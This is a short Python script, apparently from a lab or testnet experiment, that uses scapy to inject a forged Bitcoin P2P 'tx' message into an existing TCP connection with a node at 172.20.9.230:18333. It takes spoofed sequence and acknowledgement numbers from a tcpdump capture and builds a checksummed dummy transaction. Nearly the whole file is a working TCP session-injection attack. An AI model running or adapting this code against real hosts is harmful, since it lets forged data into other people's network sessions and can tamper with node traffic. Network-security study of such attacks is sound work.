from scapy.all import *
import struct
import hashlib

# --- Configuration (From your tcpdump) ---
TARGET_IP = "172.20.9.230"
TARGET_PORT = 18333
# IMPORTANT: SRC_PORT must be the port Node A was using in your tcpdump!
SRC_PORT = 54321 

# YOUR OBSERVED NUMBERS:
EXPECTED_SEQ = 1572216673
EXPECTED_ACK = 2834160184

MAGIC_TESTNET = b'\x0b\x11\x09\x07'

def get_checksum(payload):
    # Double SHA256, then take the first 4 bytes
    first_pass = hashlib.sha256(payload).digest()
    second_pass = hashlib.sha256(first_pass).digest()
    return second_pass[:4]

# --- Construct a Structurally Valid Dummy TX ---
# This is a standard 1-input, 1-output P2PKH transaction structure
# version(4) + in_count(1) + prev_tx(32) + out_idx(4) + script_len(1) + script(0) + seq(4) + out_count(1) + value(8) + script_len(1) + script(25) + locktime(4)
# A classic, structurally perfect dummy transaction hex
dummy_tx_payload = bytes.fromhex(
    "01000000" + # Version 1
    "01" +       # 1 Input
    "00"*32 +    # Dummy Prev TXID
    "ffffffff" + # Index
    "01" +       # Script length (1 byte)
    "00" +       # Script (OP_0)
    "ffffffff" + # Sequence
    "01" +       # 1 Output
    "00e1f50500000000" + # Value
    "1976a914" + "bb"*20 + "88ac" + # Standard P2PKH Script
    "00000000"   # Locktime
)

# --- Construct the Bitcoin 'tx' P2P Message ---
command = b'tx'.ljust(12, b'\x00')
length = struct.pack('<I', len(dummy_tx_payload))
check = get_checksum(dummy_tx_payload)
bitcoin_msg = MAGIC_TESTNET + command + length + check + dummy_tx_payload

# --- Build the TCP Packet ---
print(f"[*] Injecting TX message...")
print(f"[*] SEQ: {EXPECTED_SEQ} | ACK: {EXPECTED_ACK}")

ip = IP(dst=TARGET_IP)
tcp = TCP(sport=SRC_PORT, dport=TARGET_PORT, flags='PA', seq=EXPECTED_SEQ, ack=EXPECTED_ACK)

# Send the packet
send(ip/tcp/bitcoin_msg)

print("[*] Injection complete. Check Wireshark on Node B.")